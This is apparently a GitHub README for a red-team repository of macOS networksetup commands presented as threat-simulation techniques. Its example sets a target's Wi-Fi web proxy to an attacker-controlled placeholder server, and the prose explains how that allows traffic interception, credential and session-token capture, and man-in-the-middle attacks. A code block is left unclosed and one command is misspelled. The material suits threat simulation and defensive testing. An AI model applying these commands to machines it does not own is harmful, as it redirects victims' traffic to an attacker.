# NetworkSetup TTPs_Threat Simulations

## Overview

This repository provides a collection of networksetup commands to craft and scripts for crafting Tactics, Techniques, and Procedures (TTPs) and conducting threat simulations in various network environments. The networksetup commands are used to interact with network settings on macOS, offering a versatile toolset for network manipulation and testing.

## Contents

- [Installation](#installation)
- [Usage](#usage)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)

## Installation

To use the scripts and commands in this repository, ensure you have the `networksetup` utility available on macOS. Clone the repository to your local machine to access the provided scripts.

```bash
git clone https://github.com/sasquatchchicken/networksetup-ttps.git
cd networksetup-ttps

## Usage

- VLAN configuration
- Network service manipulation
- Preferred wireless networks management
- Proxy settings adjustment

## Examples

Craft a TTP for bypassing proxy settings:

For a threat actor, this command can be part of a technique to redirect or intercept web traffic on the target machine through a proxy controlled by the attacker. It could be used for various malicious purposes, such as:

#Traffic Interception: The attacker can intercept and analyze web traffic passing through the configured proxy server, potentially capturing sensitive information like login credentials or session tokens.

#Man-in-the-Middle (MitM) Attacks: By controlling the proxy server, the attacker can perform man-in-the-middle attacks, altering or injecting content into the communication between the target machine and the web servers.

#Bypassing Content Filters: A proxy server can be used to bypass content filters or access restricted content by making requests on behalf of the target machine.

# Enable the proxy settings
networksetup -setwebproxy "Wi-Fi" proxy.<server_address> <Server_Port>

# Bypass the proxy
networksetup -setproxybypassdomains "Wi-Fi" "*.internal.lan" "*.local"

# Display the updated proxy settings
networksetup -getwebproxy "Wi-Fi"
etworksetup -getproxybypassdomains "Wi-Fi"

